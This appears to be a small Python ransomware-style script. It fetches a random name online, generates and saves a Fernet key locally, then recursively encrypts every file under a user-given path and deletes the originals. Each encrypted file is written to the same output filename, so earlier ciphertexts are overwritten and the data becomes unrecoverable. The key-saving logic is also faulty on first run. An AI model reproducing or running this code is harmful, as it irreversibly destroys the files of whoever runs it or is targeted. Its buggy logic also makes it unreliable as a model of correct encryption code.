import os
import json
import requests
from cryptography.fernet import Fernet


def name():
    url = "https://randomuser.me/api/"
  

    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()

        name = data["results"][0]["name"]["first"]
        return name
    else:
        print("Connection error")
        return None




def save_to_file(name, key):
    
    if not os.path.exists("test_keys.json"):
        with open("test_keys.json", "x") as file:
            json.dump({}, file)
    else:
        pass

        
        with open("test_keys.json", "r") as file:
            file_data = json.load(file)

            if name not in file_data:
                file_data[name] = key

                with open("test_keys.json", "w") as file:
                    json.dump(file_data, file, indent=4)
            else:
                print("repeating")


def encrypt_file(key_encrypt, input_path, get_name):
    for foldername, subfolders, filenames in os.walk(input_path):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)

            Cipher = Fernet(key_encrypt)

            try:
                with open(file_path, "rb") as file:
                    orginal = file.read()

                    encrypted = Cipher.encrypt(orginal)
                    
                    new_name = get_name + "." + "encrypted"

                    with open(new_name, "wb") as file:
                        file.write(encrypted)

                        os.remove(file_path)
            except (Exception) as e:
                print(e)
        
            



if __name__ == "__main__":
    get_name = name()
    key = Fernet.generate_key().decode()

    save_to_file(get_name, key)

    input_path = input("Enter path: ")

    with open("test_keys.json", "r") as file:
        file_info = json.load(file)

        key_encrypt = file_info[get_name].encode()
        encrypt_file(key_encrypt, input_path, get_name)






